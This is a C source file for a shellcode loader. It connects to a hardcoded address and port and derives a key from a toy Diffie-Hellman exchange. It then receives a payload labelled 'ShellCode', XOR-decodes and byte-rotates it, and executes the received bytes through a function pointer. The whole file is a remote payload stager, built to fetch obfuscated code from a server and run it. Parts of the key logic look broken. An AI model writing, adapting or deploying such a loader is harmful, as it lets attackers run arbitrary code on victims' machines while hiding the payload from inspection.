#define IP "127.0.0.1"
#define PORT 8080

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/mman.h>

#define MAXLINE 4096

long power(long x, long y, long p){
    long result = 1;
    x %= p;
    //printf("X: %d\n", x);
    //for (int i = 0 ; i < 32; i++)
    //    x << 2;
    //printf("Modified X: %d\n", x);
    if (x == 0)
        return 0;
    //int bin[64];
    //int i=0;
   //for ( ;y > 0; ){
     // bin[i++] = y % 2;
       // y /= 2;
   //}
    while(!(y <= 0)){
        if(y %2 == 1)
            result = (result * x) % p;
        y /= 2;
        x = (x*x) % p;
    }
    return result;
}

int main(){
    int sockfd, client_socket;
    struct sockaddr_in servaddr;
    
    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ){
        perror("Socket Creation Failed");
        exit(EXIT_FAILURE);
    }
    
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(PORT);
    servaddr.sin_addr.s_addr = inet_addr(IP);

    connect(sockfd, (struct sockaddr_in *)&servaddr, sizeof(servaddr));
    char reply[MAXLINE];
    memset(reply, 0, sizeof(reply));
    
    int P=251, G=6;
    int a=rand()%(G-2)+2;
    printf("a: %d\n", a);
    long A=power(G, a, P);
    printf("A: %d\n", A);
    recv(sockfd, reply, 4096, 0);
    int B=atoi(reply);
    printf("B: %d\n", B);
    memset(reply, 0, sizeof(reply));
    sprintf(reply, "%d\n", A);
    send(sockfd, reply, 4096, 0);
    long key=power(G, A*B, P);
    printf("key: %d\n", key);
    char buffer[MAXLINE];
    memset(reply, 0, sizeof(reply));
    recv(sockfd, reply, 4096, 0);
    printf("size: %d\n",strlen(reply));
    printf("ShellCode: %s\n", reply);

    const int len=strlen(reply);
    unsigned char buff2[4096];
    memset(buff2, 0, sizeof buff2);

    for(int i=0; i<len; i++){
        buff2[i]=reply[i]^key;
    }
    for (int i = 0 ; i < (key%strlen(buff2)); i++){
    	int j, last = buff2[len-1];
    	for (j = len-1 ; j > 0; j--){
    		buff2[j] = buff2[j-1];
    	}
    	buff2[0] = last;
    }
    /*for (int i = 0 ; i < (key%strlen(buff2)); i++){
    	int j, start = buff2[0];
    	for (int j = 0 ; j < len ; j++){
    		buff2[j] = buff2[j+1];
    	}
    	buff2[j] = start;
    }
*/
    int(*ret)() = (int(*)())buff2;
    (int)(*ret)();
}